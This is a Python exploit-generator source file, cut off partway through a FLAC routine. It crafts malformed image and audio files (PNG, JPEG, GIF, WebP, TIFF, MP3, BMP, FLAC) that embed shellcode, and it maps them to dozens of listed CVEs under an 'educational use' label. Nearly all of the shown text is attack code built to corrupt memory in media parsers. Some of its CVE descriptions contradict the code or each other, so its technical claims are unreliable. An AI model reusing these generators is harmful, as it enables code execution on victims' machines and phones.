#!/usr/bin/env python3
"""
Exploit Header Generator for Polyglot Images
=============================================
Generates malicious image headers that exploit known CVEs in image parsing libraries.

EDUCATIONAL/RESEARCH USE ONLY
This demonstrates image viewer exploitation techniques.

Supported CVEs:

EXISTING (5 CVEs):
- CVE-2015-8540 (libpng) - Buffer overflow in png_check_chunk_name
- CVE-2019-7317 (libpng) - Out-of-bounds access in png_image_finish_read
- CVE-2018-14498 (libjpeg) - Heap buffer over-read
- CVE-2019-15133 (giflib) - Division by zero / out-of-bounds read
- CVE-2016-3977 (giflib) - Heap buffer overflow

NEW - PRIORITY 1 (3 CVEs):
- CVE-2023-4863 (libwebp) - Heap overflow in Huffman decoder (CRITICAL - ACTIVELY EXPLOITED)
- CVE-2024-10573 (mpg123) - Frankenstein stream heap overflow
- CVE-2023-52356 (libtiff) - Heap overflow in TIFFReadRGBATileExt

NEW - PRIORITY 2 (6 CVEs):
- CVE-2017-8373 (libmad) - Heap overflow in mad_layer_III
- CVE-2006-0006 (Windows Media Player BMP) - Heap overflow in bitmap processing
- CVE-2020-22219 (FLAC) - Buffer overflow in bitwriter_grow_
- CVE-2020-0499 (FLAC) - Heap OOB read in bitreader
- CVE-2008-1083 (Windows GDI) - EMF/WMF heap overflow
- CVE-2005-4560 (WMF) - SETABORTPROC code execution

NEW - PRIORITY 3 (6 CVEs):
- CVE-2017-6827 (audiofile) - MSADPCM heap overflow
- CVE-2018-5146 (libvorbis) - OGG Vorbis OOB write
- CVE-2022-22675 (AppleAVD) - Video accelerator buffer overflow
- CVE-2021-0561 (FLAC) - Encoder OOB write
- CVE-2017-11126 (mpg123) - Global buffer overflow in Layer III
- CVE-2021-40426 (libsox) - SPHERE file heap overflow

NEW - 2025 macOS OVERFLOWS (5 CVEs):
- CVE-2025-43300 (ImageIO) - DNG/TIFF JPEG Lossless OOB write (CRITICAL - ACTIVELY EXPLOITED ZERO-DAY)
- CVE-2025-24228 (macOS Kernel) - Buffer overflow with kernel privileges
- CVE-2025-24153 (SMB) - Buffer overflow enabling kernel code execution
- CVE-2025-24156 (Xsan) - Integer overflow privilege escalation
- CVE-2025-24154 (WebContentFilter) - Out-of-bounds write kernel memory corruption

NEW - 2025 WINDOWS OVERFLOWS (3 CVEs):
- CVE-2025-60724 (GDI+) - Heap overflow RCE via malicious metafile (CVSS 9.8)
- CVE-2025-62215 (Kernel) - Race condition double-free SYSTEM escalation (ACTIVELY EXPLOITED)
- CVE-2025-47981 (SPNEGO) - Zero-click heap overflow RCE via network (CVSS 9.8)

NEW - 2025 LINUX OVERFLOWS (2 CVEs):
- CVE-2025-0927 (HFS+) - Filesystem heap overflow for root/kernel privileges
- CVE-2025-37810 (Kernel) - Out-of-bounds write privilege escalation

NEW - 2025 iOS/iPhone OVERFLOWS (5 CVEs):
- CVE-2025-24085 (Core Media) - Use-after-free privilege escalation (ACTIVELY EXPLOITED)
- CVE-2025-31200 (CoreAudio) - Zero-click RCE via audio file/iMessage (CRITICAL, ACTIVELY EXPLOITED)
- CVE-2025-31201 (PAC/RPAC) - Pointer Authentication bypass for kernel exploitation
- CVE-2025-24201 (WebKit) - OOB write sandbox escape (ACTIVELY EXPLOITED)
- CVE-2025-24200 (Authorization) - USB Restricted Mode bypass (physical access)

NEW - 2025 ANDROID OVERFLOWS (10 CVEs):
- CVE-2025-48593 (Android System) - Zero-click RCE buffer overflow (CRITICAL, CVSS 9.8)
- CVE-2025-21042 (Samsung) - DNG image processing OOB write, LANDFALL spyware (ACTIVELY EXPLOITED)
- CVE-2025-21043 (Samsung) - Out-of-bounds write arbitrary code execution
- CVE-2025-38352 (Kernel) - POSIX CPU timers race condition PE (ACTIVELY EXPLOITED)
- CVE-2025-48543 (Runtime) - Use-after-free sandbox escape (ACTIVELY EXPLOITED)
- CVE-2025-21479 (Qualcomm GPU) - Adreno GPU memory corruption (ACTIVELY EXPLOITED)
- CVE-2025-27038 (Qualcomm GPU) - Adreno GPU use-after-free (ACTIVELY EXPLOITED)
- CVE-2025-27363 (Android RCE) - Remote code execution (ACTIVELY EXPLOITED, CVSS 8.1)
- CVE-2025-20708 (MediaTek) - Modem OOB write via rogue base station
- CVE-2025-20672 (MediaTek) - Bluetooth driver heap overflow

Author: SWORDIntel
Date: 2025-11-12 (Updated with 45 CVEs total: 5 macOS + 3 Windows + 2 Linux + 5 iOS + 10 Android from 2025)
"""

import sys
import struct
import argparse
import logging
from pathlib import Path

# Import TUI helper
sys.path.insert(0, str(Path(__file__).parent))
try:
    from tui_helper import TUI
except ImportError:
    # Fallback if TUI helper not available
    TUI = None

# Import validation utilities
try:
    from validation_utils import ValidationError, setup_logging
except ImportError:
    # Fallback
    class ValidationError(Exception):
        pass
    setup_logging = None

# Import Intel acceleration
try:
    from intel_acceleration import get_accelerator
    ACCEL_AVAILABLE = True
except ImportError:
    ACCEL_AVAILABLE = False
    get_accelerator = None


class ExploitHeaderGenerator:
    """Generates malicious image headers for CVE exploitation"""

    def __init__(self, use_acceleration: bool = True, verbose: bool = False):
        """
        Initialize exploit generator

        Args:
            use_acceleration: Enable Intel NPU/GPU acceleration if available
            verbose: Enable verbose logging
        """
        self.logger = setup_logging(verbose=verbose, name='exploit_generator') if setup_logging else logging.getLogger()
        self.accelerator = None
        if use_acceleration and ACCEL_AVAILABLE:
            try:
                self.accelerator = get_accelerator(verbose=False)
            except Exception as e:
                self.logger.debug(f"Hardware acceleration not available: {e}")
                # Fall back to CPU

        self.exploits = {
            # EXISTING CVEs
            'CVE-2015-8540': self._cve_2015_8540_libpng,
            'CVE-2019-7317': self._cve_2019_7317_libpng,
            'CVE-2018-14498': self._cve_2018_14498_libjpeg,
            'CVE-2019-15133': self._cve_2019_15133_giflib,
            'CVE-2016-3977': self._cve_2016_3977_giflib,

            # NEW - PRIORITY 1 (Critical, Recent, High-Impact)
            'CVE-2023-4863': self._cve_2023_4863_libwebp,
            'CVE-2024-10573': self._cve_2024_10573_mpg123,
            'CVE-2023-52356': self._cve_2023_52356_libtiff,

            # NEW - PRIORITY 2 (High-Value Legacy)
            'CVE-2017-8373': self._cve_2017_8373_libmad,
            'CVE-2006-0006': self._cve_2006_0006_bmp,
            'CVE-2020-22219': self._cve_2020_22219_flac,
            'CVE-2020-0499': self._cve_2020_0499_flac,
            'CVE-2008-1083': self._cve_2008_1083_emf_wmf,
            'CVE-2005-4560': self._cve_2005_4560_wmf,

            # NEW - PRIORITY 3 (Audio/Video Expansion)
            'CVE-2017-6827': self._cve_2017_6827_audiofile_wav,
            'CVE-2018-5146': self._cve_2018_5146_libvorbis,
            'CVE-2022-22675': self._cve_2022_22675_appleavd,
            'CVE-2021-0561': self._cve_2021_0561_flac,
            'CVE-2017-11126': self._cve_2017_11126_mpg123,
            'CVE-2021-40426': self._cve_2021_40426_libsox,

            # NEW - 2025 macOS OVERFLOWS (Most Recent)
            'CVE-2025-43300': self._cve_2025_43300_imageio_dng,
            'CVE-2025-24228': self._cve_2025_24228_kernel,
            'CVE-2025-24153': self._cve_2025_24153_smb,
            'CVE-2025-24156': self._cve_2025_24156_xsan,
            'CVE-2025-24154': self._cve_2025_24154_webcontentfilter,

            # NEW - 2025 WINDOWS OVERFLOWS
            'CVE-2025-60724': self._cve_2025_60724_gdiplus,
            'CVE-2025-62215': self._cve_2025_62215_kernel_race,
            'CVE-2025-47981': self._cve_2025_47981_spnego,

            # NEW - 2025 LINUX OVERFLOWS
            'CVE-2025-0927': self._cve_2025_0927_hfsplus,
            'CVE-2025-37810': self._cve_2025_37810_kernel_oob,

            # NEW - 2025 iOS/iPhone OVERFLOWS
            'CVE-2025-24085': self._cve_2025_24085_coremedia,
            'CVE-2025-31200': self._cve_2025_31200_coreaudio,
            'CVE-2025-31201': self._cve_2025_31201_pac_bypass,
            'CVE-2025-24201': self._cve_2025_24201_webkit,
            'CVE-2025-24200': self._cve_2025_24200_usb_restrict,

            # NEW - 2025 ANDROID OVERFLOWS
            'CVE-2025-48593': self._cve_2025_48593_android_system,
            'CVE-2025-21042': self._cve_2025_21042_samsung_dng,
            'CVE-2025-21043': self._cve_2025_21043_samsung_oob,
            'CVE-2025-38352': self._cve_2025_38352_kernel_race,
            'CVE-2025-48543': self._cve_2025_48543_runtime_uaf,
            'CVE-2025-21479': self._cve_2025_21479_qualcomm_gpu,
            'CVE-2025-27038': self._cve_2025_27038_qualcomm_uaf,
            'CVE-2025-27363': self._cve_2025_27363_android_rce,
            'CVE-2025-20708': self._cve_2025_20708_mediatek_modem,
            'CVE-2025-20672': self._cve_2025_20672_mediatek_bt,
        }

    def _cve_2015_8540_libpng(self, shellcode):
        """
        CVE-2015-8540: libpng buffer overflow in png_check_chunk_name

        Vulnerability: libpng 1.6.x allows remote attackers to cause DoS or
        possibly have unspecified other impact via a chunk name that is too long.

        Exploit: Create PNG with malformed chunk name (> 4 bytes)
        """
        png_header = b'\x89PNG\r\n\x1a\n'  # PNG signature

        # IHDR chunk (valid)
        ihdr_data = struct.pack('>IIBBBBB',
            1, 1,  # Width, height (1x1)
            8, 2,  # Bit depth, color type (RGB)
            0, 0, 0  # Compression, filter, interlace
        )
        ihdr_chunk = struct.pack('>I', len(ihdr_data)) + b'IHDR' + ihdr_data
        ihdr_crc = self._crc32(b'IHDR' + ihdr_data)
        ihdr_chunk += struct.pack('>I', ihdr_crc)

        # Malicious chunk with oversized name (triggers overflow)
        # Chunk name should be 4 bytes, we send much more to overflow buffer
        malicious_chunk_name = b'AAAA' * 64  # 256 bytes instead of 4

        # Embed shellcode in chunk data
        chunk_data = shellcode + b'\x00' * (256 - len(shellcode))

        malicious_chunk = struct.pack('>I', len(chunk_data))
        malicious_chunk += malicious_chunk_name[:256]  # Oversized name
        malicious_chunk += chunk_data
        # Intentionally wrong CRC to avoid other checks
        malicious_chunk += b'\x00\x00\x00\x00'

        # IEND chunk
        iend_chunk = b'\x00\x00\x00\x00IEND\xae\x42\x60\x82'

        return png_header + ihdr_chunk + malicious_chunk + iend_chunk

    def _cve_2019_7317_libpng(self, shellcode):
        """
        CVE-2019-7317: libpng out-of-bounds access

        Vulnerability: Use-after-free in png_image_free

        Exploit: Crafted PNG with specific chunk ordering causes memory corruption
        """
        png_header = b'\x89PNG\r\n\x1a\n'

        # IHDR with large dimensions to trigger allocation
        ihdr_data = struct.pack('>IIBBBBB',
            0xFFFF, 0xFFFF,  # Huge dimensions (will fail allocation)
            8, 6,  # RGBA
            0, 0, 0
        )
        ihdr = self._make_chunk(b'IHDR', ihdr_data)

        # tRNS chunk before PLTE (invalid order, triggers use-after-free)
        trns_data = b'\x00\x00\x00\xFF' * 64
        trns = self._make_chunk(b'tRNS', trns_data)

        # Shellcode in iCCP chunk (embedded in chunk data)
        iccp_data = b'profile\x00\x00' + shellcode + b'\x00' * (1024 - len(shellcode))
        iccp = self._make_chunk(b'iCCP', iccp_data)

        iend = b'\x00\x00\x00\x00IEND\xae\x42\x60\x82'

        return png_header + ihdr + trns + iccp + iend

    def _cve_2018_14498_libjpeg(self, shellcode):
        """
        CVE-2018-14498: libjpeg heap buffer over-read

        Vulnerability: get_8bit_row in rdbmp.c allows remote attackers to
        cause DoS via crafted BMP file.

        Exploit: Malformed JPEG with embedded shellcode in comment marker
        """
        # JPEG SOI
        jpeg = b'\xff\xd8'

        # APP0 marker (JFIF)
        app0 = b'\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
        jpeg += app0

        # Comment marker with shellcode (COM segment)
        com_data = shellcode + b'\x00' * (65530 - len(shellcode))
        com = b'\xff\xfe' + struct.pack('>H', len(com_data) + 2) + com_data
        jpeg += com

        # Malformed DQT (quantization table) - triggers heap overflow
        # Size field is incorrect, causes over-read
        dqt = b'\xff\xdb'  # DQT marker
        dqt += b'\xff\xff'  # Intentionally huge size (65535 bytes)
        dqt += b'\x00' * 64  # Actual data much smaller
        jpeg += dqt

        # SOF0 (Start of frame) - minimal valid frame
        sof0 = b'\xff\xc0\x00\x0b\x08\x00\x01\x00\x01\x01\x01\x11\x00'
        jpeg += sof0

        # SOS (Start of scan)
        sos = b'\xff\xda\x00\x08\x01\x01\x00\x00\x3f\x00'
        jpeg += sos

        # Image data (minimal)
        jpeg += b'\xff\x00' * 10

        # EOI
        jpeg += b'\xff\xd9'

        return jpeg

    def _cve_2019_15133_giflib(self, shellcode):
        """
        CVE-2019-15133: GIF LIB division by zero

        Vulnerability: DGifSlurp in dgif_lib.c allows attackers to cause DoS
        via crafted GIF with width/height of 0.

        Exploit: GIF with zero dimensions and shellcode in comment extension
        """
        gif = b'GIF89a'  # GIF header

        # Logical screen descriptor with zero dimensions (triggers division by zero)
        gif += struct.pack('<HH', 0, 0)  # Width=0, Height=0
        gif += b'\x80'  # Global color table flag
        gif += b'\x00'  # Background color
        gif += b'\x00'  # Pixel aspect ratio

        # Global color table (minimal)
        gif += b'\x00\x00\x00\xff\xff\xff'  # 2 colors

        # Comment extension with shellcode
        gif += b'\x21\xfe'  # Comment extension

        # Split shellcode into 255-byte blocks
        for i in range(0, len(shellcode), 255):
            block = shellcode[i:i+255]
            gif += bytes([len(block)]) + block

        gif += b'\x00'  # Terminator

        # Image descriptor (malformed)
        gif += b'\x2c'  # Image separator
        gif += b'\x00\x00\x00\x00'  # Left, Top
        gif += struct.pack('<HH', 1, 1)  # Width, Height
        gif += b'\x00'  # Flags

        # Image data (minimal)
        gif += b'\x02\x02\x44\x01\x00'

        # GIF trailer
        gif += b'\x3b'

        return gif

    def _cve_2016_3977_giflib(self, shellcode):
        """
        CVE-2016-3977: GIF heap buffer overflow

        Vulnerability: Heap overflow in gif2rgb via crafted GIF file

        Exploit: GIF with malformed local color table size
        """
        gif = b'GIF89a'

        # Logical screen descriptor
        gif += struct.pack('<HH', 1, 1)
        gif += b'\xf0'  # Global color table: yes, 8 colors (3 bits)
        gif += b'\x00\x00'

        # Global color table (2^3 = 8 colors)
        gif += b'\x00\x00\x00' * 8

        # Application extension with shellcode
        gif += b'\x21\xff\x0b'  # Application extension
        gif += b'NETSCAPE2.0'

        # Shellcode in application data
        for i in range(0, len(shellcode), 255):
            block = shellcode[i:i+255]
            gif += bytes([len(block)]) + block
        gif += b'\x00'

        # Image descriptor with malformed local color table
        gif += b'\x2c\x00\x00\x00\x00'
        gif += struct.pack('<HH', 256, 256)  # Large dimensions
        gif += b'\x87'  # Local color table: yes, 256 colors (INTENTIONALLY WRONG SIZE)

        # Local color table buffer overflow
        # Claim 256 colors but provide much more data
        gif += b'\x41\x41\x41' * 512  # 512 * 3 = 1536 bytes instead of 768

        # Image data
        gif += b'\x08'  # LZW minimum code size
        gif += b'\x00'  # Data sub-block (empty)

        gif += b'\x3b'  # Trailer

        return gif

    # ==================== PRIORITY 1 CVEs ====================

    def _cve_2023_4863_libwebp(self, shellcode):
        """
        CVE-2023-4863: libwebp critical heap buffer overflow (ACTIVELY EXPLOITED)

        Vulnerability: Heap overflow in ReadHuffmanCodes() function during WebP
        lossless decoding. BuildHuffmanTable() writes beyond allocated HuffmanCode
        buffer when processing second-level Huffman tables.

        Target: libwebp 0.5.0 - 1.3.1
        Impact: RCE via crafted WebP image (Zero-day, exploited in wild)
        CVSS: 8.8 (Critical)
        """
        # WebP RIFF container
        webp = b'RIFF'

        # Calculate file size later, placeholder for now
        size_pos = len(webp)
        webp += b'\x00\x00\x00\x00'  # File size (will update)

        # WebP signature
        webp += b'WEBP'

        # VP8L (lossless) chunk - this is where vulnerability lives
        webp += b'VP8L'

        # VP8L chunk size (placeholder)
        vp8l_size_pos = len(webp)
        webp += b'\x00\x00\x00\x00'

        # VP8L data starts here
        vp8l_data_start = len(webp)

        # VP8L signature byte (0x2f for lossless)
        webp += b'\x2f'

        # Image dimensions: 14 bits width-1, 14 bits height-1
        # Use 256x256 image
        width = 256
        height = 256

        # Pack width-1 (14 bits) + height-1 (14 bits) + alpha (1 bit) + version (3 bits)
        dim_data = ((width - 1) & 0x3FFF) | (((height - 1) & 0x3FFF) << 14)
        webp += struct.pack('<I', dim_data)[:4]

        # Transform and color cache bits
        # Set to 0 (no transforms, but we'll add color cache)
        webp += b'\x00'

        # Huffman image - this triggers the vulnerability
        # The bug is in how it handles codes longer than 8 bits

        # Prefix: Huffman coded image (not simple)
        webp += b'\x00'

        # Meta Huffman codes
        # These control how the actual Huffman codes are encoded

        # Number of code length codes (between 4-19)
        num_code_len_codes = 19
        webp += bytes([(num_code_len_codes - 4)])

        # Code length code lengths (3 bits each, packed)
        # These trigger the vulnerability when combined with color_cache_bits
        code_len_codes = [3] * 19  # All 3-bit codes

        packed_codes = bytearray()
        bit_buffer = 0
        bits_in_buffer = 0

        for code_len in code_len_codes:
            bit_buffer |= (code_len << bits_in_buffer)
            bits_in_buffer += 3

            while bits_in_buffer >= 8:
                packed_codes.append(bit_buffer & 0xFF)
                bit_buffer >>= 8
                bits_in_buffer -= 8

        if bits_in_buffer > 0:
            packed_codes.append(bit_buffer & 0xFF)

        webp += bytes(packed_codes)

        # Actual Huffman codes for ARGB image
        # We need to encode codes that will overflow the buffer

        # For each color component, we specify Huffman codes
        # We use longer codes (>8 bits) to trigger second-level table overflow

        # Number of Huffman code groups (simplified: 1 group)
        webp += b'\x00'  # 0 means 1 group

        # Huffman codes for Green channel (exploited channel)
        # We'll create codes up to 15 bits to overflow the 8-bit buffer

        # Max alphabet size for green
        max_symbol = 256  # Full 8-bit range

        # Create code lengths that will overflow
        # Mix of short (valid) and long (overflow) codes
        code_lengths = bytearray()

        for i in range(max_symbol):
            if i < 128:
                code_lengths.append(8)  # Normal 8-bit codes
            else:
                code_lengths.append(15)  # Max length - triggers overflow!

        # Encode these code lengths (simplified encoding)
        # In real WebP, these would be Huffman-encoded themselves
        webp += bytes([max_symbol & 0xFF])  # Alphabet size low byte
        webp += bytes([(max_symbol >> 8) & 0xFF])  # High byte

        # Code lengths (simplified)
        webp += code_lengths[:256]

        # Shellcode embedded in image data
        # After overflow, this may be executed
        image_data = shellcode + b'\x00' * (512 - len(shellcode))
        webp += image_data

        # Pad to byte boundary
        if len(webp) % 2:
            webp += b'\x00'

        # Update VP8L chunk size
        vp8l_size = len(webp) - vp8l_data_start
        webp = webp[:vp8l_size_pos] + struct.pack('<I', vp8l_size) + webp[vp8l_size_pos + 4:]

        # Update RIFF file size (total - 8 bytes for RIFF header)
        file_size = len(webp) - 8
        webp = webp[:size_pos] + struct.pack('<I', file_size) + webp[size_pos + 4:]

        return webp

    def _cve_2024_10573_mpg123(self, shellcode):
        """
        CVE-2024-10573: mpg123 "Frankenstein's Monster" heap overflow

        Vulnerability: Buffer overflow when decoding PCM samples from MP3 streams
        that change properties mid-stream ("Frankenstein streams"). Requires
        seeking/scanning to trigger.

        Target: mpg123 < 1.32.8
        Impact: Heap corruption, possible RCE
        CVSS: 6.7 (Moderate - but exploitable)
        """
        # MP3 file with changing properties (Frankenstein stream)

        # ID3v2 header (makes it look legitimate)
        mp3 = b'ID3'
        mp3 += b'\x04\x00'  # Version 2.4
        mp3 += b'\x00'      # Flags (no unsync, no extended header)

        # ID3 size (synchsafe integer - 7 bits per byte)
        id3_size = 1024
        mp3 += bytes([
            (id3_size >> 21) & 0x7F,
            (id3_size >> 14) & 0x7F,
            (id3_size >> 7) & 0x7F,
            id3_size & 0x7F
        ])

        # ID3 Title frame
        mp3 += b'TIT2'  # Title frame
        mp3 += struct.pack('>I', 20)  # Frame size
        mp3 += b'\x00\x00'  # Flags
        mp3 += b'\x00'  # Text encoding (ISO-8859-1)
        mp3 += b'Frankenstein MP3\x00'

        # Padding to reach ID3 size
        mp3 += b'\x00' * (id3_size - 30)

        # MP3 Frame 1: 44.1kHz, Stereo, 128kbps
        # This establishes initial output buffer properties

        # Sync word (11 bits) + MPEG1 (2 bits) + Layer III (2 bits) + No CRC (1 bit)
        frame1 = b'\xFF\xFB'

        # Bitrate: 128kbps (1001) + Sample rate: 44.1kHz (00) + Padding (0) + Private (0)
        frame1 += b'\x90'

        # Channel mode: Stereo (00) + Mode ext (00) + Copyright (0) + Original (0) + Emphasis (00)
        frame1 += b'\x00'

        # Side info + main data (417 bytes for 128kbps frame)
        frame1 += b'\x00' * 413

        mp3 += frame1

        # MP3 Frame 2: CHANGED to 48kHz, Mono, 64kbps
        # This property change triggers the vulnerability!
        frame2 = b'\xFF\xFB'

        # Bitrate: 64kbps (0101) + Sample rate: 48kHz (01) + No padding + Private
        frame2 += b'\x54'  # 0101 0100

        # Channel mode: Mono (11) + Mode ext (00) + Copyright + Original + Emphasis
        frame2 += b'\xC0'  # 1100 0000

        # Frame data (smaller for 64kbps)
        frame2 += b'\x00' * 200

        mp3 += frame2

        # MP3 Frame 3: Change AGAIN to 22.05kHz, Stereo, 96kbps
        # Multiple changes increase likelihood of overflow
        frame3 = b'\xFF\xFB'
        frame3 += b'\x74'  # Bitrate 96kbps + Sample rate 22.05kHz
        frame3 += b'\x04'  # Back to stereo
        frame3 += b'\x00' * 300

        mp3 += frame3

        # Embed shellcode in a custom private data frame
        # Position it where overflow might write to
        private_frame = b'\xFF\xFB\xF0\x00'  # Custom frame marker
        private_frame += shellcode
        private_frame += b'\x00' * (256 - len(shellcode))

        mp3 += private_frame

        # Add several more normal frames to ensure seeking happens
        for i in range(20):
            mp3 += b'\xFF\xFB\x90\x00' + b'\x00' * 413

        return mp3

    def _cve_2023_52356_libtiff(self, shellcode):
        """
        CVE-2023-52356: libtiff heap buffer overflow

        Vulnerability: Improper handling in TIFFReadRGBATileExt() API causes
        heap buffer overflow when processing crafted TIFF files with malformed
        tile dimensions.

        Target: libtiff < 4.7.0rc1
        Impact: DoS, heap corruption, possible RCE
        CVSS: 7.8 (High)
        """
        # TIFF Header (Little Endian)
        tiff = b'II'  # Little endian identifier
        tiff += b'\x2A\x00'  # TIFF magic number (42)

        # Offset to first IFD (Image File Directory)
        ifd_offset = 8
        tiff += struct.pack('<I', ifd_offset)

        # === IFD (Image File Directory) ===
        ifd_start = len(tiff)

        # Number of directory entries
        num_entries = 15
        tiff += struct.pack('<H', num_entries)

        # IFD Entry format: Tag (2) | Type (2) | Count (4) | Value/Offset (4)

        # 1. ImageWidth - Large value to trigger overflow
        tiff += struct.pack('<HHII', 256, 4, 1, 65535)

        # 2. ImageLength - Also large
        tiff += struct.pack('<HHII', 257, 4, 1, 65535)

        # 3. BitsPerSample
        tiff += struct.pack('<HHII', 258, 3, 3, 0)  # Offset to values (will write later)
        bits_per_sample_offset = len(tiff) - 4

        # 4. Compression - No compression
        tiff += struct.pack('<HHII', 259, 3, 1, 1)

        # 5. PhotometricInterpretation - RGB
        tiff += struct.pack('<HHII', 262, 3, 1, 2)

        # 6. StripOffsets - Point to image data with shellcode
        strip_offset_value = 1024  # Will place shellcode here
        tiff += struct.pack('<HHII', 273, 4, 1, strip_offset_value)

        # 7. SamplesPerPixel - 3 (RGB)
        tiff += struct.pack('<HHII', 277, 3, 1, 3)

        # 8. RowsPerStrip - 1 row per strip (creates many strips)
        tiff += struct.pack('<HHII', 278, 4, 1, 1)

        # 9. StripByteCounts - MALFORMED: Huge value triggers overflow
        tiff += struct.pack('<HHII', 279, 4, 1, 0xFFFFFFF0)  # Nearly max uint32

        # 10. XResolution
        tiff += struct.pack('<HHII', 282, 5, 1, 0)  # Offset (will write later)
        xres_offset = len(tiff) - 4

        # 11. YResolution
        tiff += struct.pack('<HHII', 283, 5, 1, 0)  # Offset (will write later)
        yres_offset = len(tiff) - 4

        # 12. PlanarConfiguration - Chunky
        tiff += struct.pack('<HHII', 284, 3, 1, 1)

        # 13. TileWidth - This triggers TIFFReadRGBATileExt path!
        tiff += struct.pack('<HHII', 322, 4, 1, 256)

        # 14. TileLength - Malformed to cause overflow
        tiff += struct.pack('<HHII', 323, 4, 1, 32768)  # Huge tile height

        # 15. TileOffsets - Point to shellcode area
        tiff += struct.pack('<HHII', 324, 4, 1, strip_offset_value)

        # Offset to next IFD (0 = no more IFDs)
        tiff += struct.pack('<I', 0)

        # === Write indirect values ===

        # BitsPerSample values (8, 8, 8)
        tiff = tiff[:bits_per_sample_offset] + struct.pack('<I', len(tiff)) + tiff[bits_per_sample_offset + 4:]
        tiff += struct.pack('<HHH', 8, 8, 8)

        # XResolution (72 DPI)
        tiff = tiff[:xres_offset] + struct.pack('<I', len(tiff)) + tiff[xres_offset + 4:]
        tiff += struct.pack('<II', 72, 1)

        # YResolution (72 DPI)
        tiff = tiff[:yres_offset] + struct.pack('<I', len(tiff)) + tiff[yres_offset + 4:]
        tiff += struct.pack('<II', 72, 1)

        # Pad to shellcode offset
        while len(tiff) < strip_offset_value:
            tiff += b'\x00'

        # === Shellcode embedded as "image data" ===
        tiff += shellcode
        tiff += b'\x00' * (2048 - len(shellcode))

        return tiff

    # ==================== PRIORITY 2 CVEs ====================

    def _cve_2017_8373_libmad(self, shellcode):
        """
        CVE-2017-8373: libmad heap buffer overflow

        Vulnerability: Heap-based buffer overflow in mad_layer_III() function
        in layer3.c. Write of 2060 bytes beyond allocated heap buffer.

        Target: libmad 0.15.1b
        Impact: DoS, possible RCE
        """
        # Craft malicious MP3 with oversized Layer III data

        # ID3v2 tag
        mp3 = b'ID3\x03\x00\x00\x00\x00\x02\x00'

        # MP3 Frame Header for Layer III
        # Sync: FFF, Version: MPEG1, Layer: III, CRC: No
        # Bitrate: 128kbps, Samplerate: 44.1kHz, Padding: No
        mp3 += b'\xFF\xFB\x90\x00'

        # Side information (32 bytes for MPEG1 stereo)
        # Craft with large main_data_begin to trigger overflow
        side_info = bytearray(32)

        # main_data_begin (9 bits) - set to max to point way beyond buffer
        side_info[0] = 0xFF
        side_info[1] = 0x80  # Top bit is main_data_begin LSB

        # Rest of side info - craft to maximize data reading
        for i in range(2, 32):
            side_info[i] = 0xFF  # Max out all values

        mp3 += bytes(side_info)

        # Main data - this will overflow the buffer
        # Include shellcode that will be written beyond bounds
        main_data = shellcode + b'\x90' * (2060 - len(shellcode))  # NOP padding to 2060 bytes
        mp3 += main_data

        # Additional frame data
        mp3 += b'\x00' * 100

        return mp3

    def _cve_2006_0006_bmp(self, shellcode):
        """
        CVE-2006-0006: Windows Media Player BMP heap overflow

        Vulnerability: Heap-based buffer overflow in bitmap processing routine
        in Windows Media Player. Unchecked buffer in BMP parsing.

        Target: Windows Media Player 7.1, 9, 10
        Impact: Remote code execution
        """
        # BMP File Header
        bmp = b'BM'  # Signature

        # File size (placeholder)
        bmp += struct.pack('<I', 0)  # Will calculate
        file_size_pos = 2

        # Reserved
        bmp += b'\x00\x00\x00\x00'

        # Pixel data offset
        pixel_offset = 54 + 1024  # Header + large color table
        bmp += struct.pack('<I', pixel_offset)

        # DIB Header (BITMAPINFOHEADER)
        bmp += struct.pack('<I', 40)  # Header size

        # Width and Height - large values to trigger allocation
        bmp += struct.pack('<i', 1024)  # Width
        bmp += struct.pack('<i', 1024)  # Height

        # Planes and bit count
        bmp += struct.pack('<H', 1)   # Color planes
        bmp += struct.pack('<H', 8)   # Bits per pixel

        # Compression (0 = BI_RGB, none)
        bmp += struct.pack('<I', 0)

        # Image size (0 for BI_RGB)
        bmp += struct.pack('<I', 0)

        # X and Y pixels per meter
        bmp += struct.pack('<i', 2835)  # ~72 DPI
        bmp += struct.pack('<i', 2835)

        # Colors used and important (0 = all)
        bmp += struct.pack('<I', 256)  # 256 colors
        bmp += struct.pack('<I', 0)    # All important

        # Color table - oversized to trigger overflow
        # Should be 256 * 4 = 1024 bytes, but we send more
        for i in range(512):  # 512 colors instead of 256
            bmp += struct.pack('<BBBB', i % 256, i % 256, i % 256, 0)

        # Pixel data with embedded shellcode
        # Positioned where overflow might write to
        pixel_data = shellcode + b'\x00' * (4096 - len(shellcode))
        bmp += pixel_data

        # Update file size
        file_size = len(bmp)
        bmp = bmp[:file_size_pos] + struct.pack('<I', file_size) + bmp[file_size_pos + 4:]

        return bmp

    def _cve_2020_22219_flac(self, shellcode):
        """
        CVE-2020-22219: FLAC buffer overflow in encoder

        Vulnerability: Buffer overflow in bitwriter_grow_() function when
        encoding crafted input.

        Target: FLAC < 1.4.0
        Impact: RCE via crafted audio input to encoder
        CVSS: 7.8 (High)
        """
        # FLAC stream structure

        # fLaC marker
        flac = b'fLaC'

        # STREAMINFO metadata block (mandatory, type 0)
        # Last-metadata-block: 0, Block type: 0 (STREAMINFO), Length: 34
        flac += b'\x00\x00\x22'  # 0x000022 = 34 bytes

        # min_blocksize (16 bits) - trigger encoder overflow
        flac += struct.pack('>H', 4096)

        # max_blocksize (16 bits) - extremely large
        flac += struct.pack('>H', 65535)

        # min_framesize (24 bits) - 0 = unknown
        flac += b'\x00\x00\x00'

        # max_framesize (24 bits) - huge
        flac += b'\xFF\xFF\xFF'

        # Sample rate (20 bits): 44100 Hz
        # + Channels (3 bits): 2 channels (value = channels-1 = 1)
        # + Bits per sample (5 bits): 16 bits (value = bps-1 = 15)
        # = 20 + 3 + 5 = 28 bits (3.5 bytes)

        sample_rate = 44100
        channels_minus_1 = 1
        bps_minus_1 = 15

        # Pack into 4 bytes, use 28 bits
        packed = (sample_rate << 8) | (channels_minus_1 << 5) | bps_minus_1
        flac += struct.pack('>I', packed)

        # Total samples (36 bits) - huge to trigger overflow
        # Use 5 bytes for 36 bits
        total_samples = 0xFFFFFFFFF
        flac += struct.pack('>Q', total_samples)[3:]  # Take last 5 bytes (40 bits, use 36)

        # MD5 signature (16 bytes)
        flac += b'\x00' * 16

        # PADDING metadata block
        padding_size = 2048
        flac += b'\x01'  # Block type 1 (PADDING), not last
        flac += struct.pack('>I', padding_size)[1:]  # 24-bit length
        flac += b'\x00' * padding_size

        # APPLICATION metadata block with shellcode
        # Last-metadata-block: 1, Block type: 2 (APPLICATION)
        flac += b'\x82'  # 0x80 | 0x02

